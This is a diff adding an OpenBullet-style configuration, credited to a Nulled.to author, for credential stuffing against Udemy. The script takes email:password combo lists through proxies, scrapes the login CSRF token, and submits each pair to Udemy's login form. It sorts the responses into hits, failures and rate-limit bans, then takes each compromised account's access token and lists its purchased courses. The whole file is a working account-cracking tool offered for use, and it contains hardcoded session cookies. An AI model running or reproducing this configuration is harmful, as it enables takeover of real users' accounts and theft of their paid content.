@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Udemy.com",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-26T19:40:18.2658363-04:00",
+  "AdditionalInfo": "",
+  "Author": "By-FaceSteel Nulled.to ",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_CSRF REQUEST GET "https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es-ES,es;q=0.9,en;q=0.8,fr;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 165" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: __udmy_2_v57r=0f7650b61d314563960cb295698e4a80; ud_firstvisit=2019-03-13T01:18:55.708103+00:00:1h3sXn:HwPfu7lfwQPCj4EjgPAXMqykm8o; EUCookieMessageShown=true; __cfduid=db4b9e2d5c863b1c7b8861be5af94f88e1558717999; client_id=bd2565cb7b0c313f5e9bae44961e8db2; ud_cache_marketplace_country=US; ud_cache_device=None; ud_cache_release=8843b8e74f990186e9641bf4b712df0893cbc882; ud_cache_version=1; seen=1; _pxhd=016a583e2e439eda8aa024446d0d72ccf5d6a6db0e1159f3b4361af284ca1919:73db3821-8001-11e9-a09b-03c5824b7753; eventing_session_id=7331e27167f24f4c8e9c523310789717; csrftoken=UZ8dAWfqogEEKwSBwGW9RFiCQUGKF13bnLExfjq8aRuV6InQjZx2J4Za23td6so0; ud_cache_campaign_code=\"\"; ud_cache_logged_in=0; ud_cache_user=\"\"; ud_cache_price_country=US; ud_cache_brand=::US:en_US; ud_cache_language=en; ud_rule_vars=eJyFjUEKgzAUBa8i2bbKjzExybo3KN0FJGosoZbQ5NtFxbtXqAuhhW6HN_NmgjZeHbq-efrkMUQNQy04tIL2jFZcMCWga0vFhZKushJ0F8LNO6IzMhsy-Jjw4za9RWdWbkgJVOXAcsoyoJpKzXlRAysrdQDQAIYc19VoV7ULU0xuK6C__y4oDXWhSiEYfBWie0wu_buXHKpa7uXORmySf23SnmJAO244u5xPhixkeQPkYFRU:1hV1SM:imSQvhXPFVitW938RYIHfvla43k; evi=\"SlFDLExYDm4DQht1TFgObkcSCXtbUUV6HVFdY1RTCGATQRpzXkBPNxMFSmNUV0Z5B18JN0xYRDEdURlwXVpXdkpRXSBMWEB/CEsHYxhAT31MDgdjCAdXdkpRGXBfUld2SlFdIExYQH8DSwdjGEBPfkwOB2MdFVd2SlEZcFxaV3ZKUV0gTFhAfwZHB2MYQE99TF8Jc15STW4LCAk3D0BPeQFFGW1MFFd2AA4HY1xTRXoTSVBjGANXdgRAGnNCQANuC0JWbUxQRHkBURE6TBQUbgtGH3NaTlc6E0kaPBMf\"" 
+  HEADER "origin: https://www.udemy.com" 
+  HEADER "referer: https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  HEADER "upgrade-insecure-requests: 1" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "name='csrfmiddlewaretoken' value='" "' />" -> VAR "TOKENcsrf" 
+#LOGIN REQUEST POST "https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  CONTENT "csrfmiddlewaretoken=<TOKENcsrf>&locale=en_US&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es-ES,es;q=0.9,en;q=0.8,fr;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 165" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: __udmy_2_v57r=0f7650b61d314563960cb295698e4a80; ud_firstvisit=2019-03-13T01:18:55.708103+00:00:1h3sXn:HwPfu7lfwQPCj4EjgPAXMqykm8o; EUCookieMessageShown=true; __cfduid=db4b9e2d5c863b1c7b8861be5af94f88e1558717999; client_id=bd2565cb7b0c313f5e9bae44961e8db2; ud_cache_marketplace_country=US; ud_cache_device=None; ud_cache_release=8843b8e74f990186e9641bf4b712df0893cbc882; ud_cache_version=1; seen=1; _pxhd=016a583e2e439eda8aa024446d0d72ccf5d6a6db0e1159f3b4361af284ca1919:73db3821-8001-11e9-a09b-03c5824b7753; eventing_session_id=7331e27167f24f4c8e9c523310789717; csrftoken=UZ8dAWfqogEEKwSBwGW9RFiCQUGKF13bnLExfjq8aRuV6InQjZx2J4Za23td6so0; ud_cache_campaign_code=\"\"; ud_cache_logged_in=0; ud_cache_user=\"\"; ud_cache_price_country=US; ud_cache_brand=::US:en_US; ud_cache_language=en; ud_rule_vars=eJyFjUEKgzAUBa8i2bbKjzExybo3KN0FJGosoZbQ5NtFxbtXqAuhhW6HN_NmgjZeHbq-efrkMUQNQy04tIL2jFZcMCWga0vFhZKushJ0F8LNO6IzMhsy-Jjw4za9RWdWbkgJVOXAcsoyoJpKzXlRAysrdQDQAIYc19VoV7ULU0xuK6C__y4oDXWhSiEYfBWie0wu_buXHKpa7uXORmySf23SnmJAO244u5xPhixkeQPkYFRU:1hV1SM:imSQvhXPFVitW938RYIHfvla43k; evi=\"SlFDLExYDm4DQht1TFgObkcSCXtbUUV6HVFdY1RTCGATQRpzXkBPNxMFSmNUV0Z5B18JN0xYRDEdURlwXVpXdkpRXSBMWEB/CEsHYxhAT31MDgdjCAdXdkpRGXBfUld2SlFdIExYQH8DSwdjGEBPfkwOB2MdFVd2SlEZcFxaV3ZKUV0gTFhAfwZHB2MYQE99TF8Jc15STW4LCAk3D0BPeQFFGW1MFFd2AA4HY1xTRXoTSVBjGANXdgRAGnNCQANuC0JWbUxQRHkBURE6TBQUbgtGH3NaTlc6E0kaPBMf\"" 
+  HEADER "origin: https://www.udemy.com" 
+  HEADER "referer: https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "You have exceeded the maximum number of requests per hour" 
+  KEYCHAIN Success OR 
+    KEY "{\"returnUrl\": \"https://www.udemy.com/\"}" 
+  KEYCHAIN Failure OR 
+    KEY "Enter a valid email address." 
+    KEY "Please check your email and password." 
+#PARSE_ACCESS_TOKEN PARSE "<COOKIES(access_token)>" LR "" "" -> VAR "ACCTOKEN" 
+REQUEST GET "https://www.udemy.com/api-2.0/users/me/subscribed-courses?fields%5Bcourse%5D=@min,visible_instructors,image_480x270,favorite_time,archive_time,completion_ratio,last_accessed_time,enrollment_time,features,num_collections&fields%5Buser%5D=@min,job_title&ordering=-access_time,-enrolled&page=1&page_size=100" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.udemy.com/" 
+  HEADER "X-Udemy-Authorization: Bearer <ACCTOKEN>" 
+  HEADER "Authorization: Bearer <ACCTOKEN>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"count\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"count\": 0," 
+#CAPTURE_Total_Courses PARSE "<SOURCE>" LR "{\"count\":" ",\"" -> CAP "Total Courses" "|" "|" 
+#CAPTURE_TITLES PARSE "<SOURCE>" LR "url\":\"" "/learn/\",\"" -> CAP "Course URL" "" "| By FaceSteel Nulled.to" 
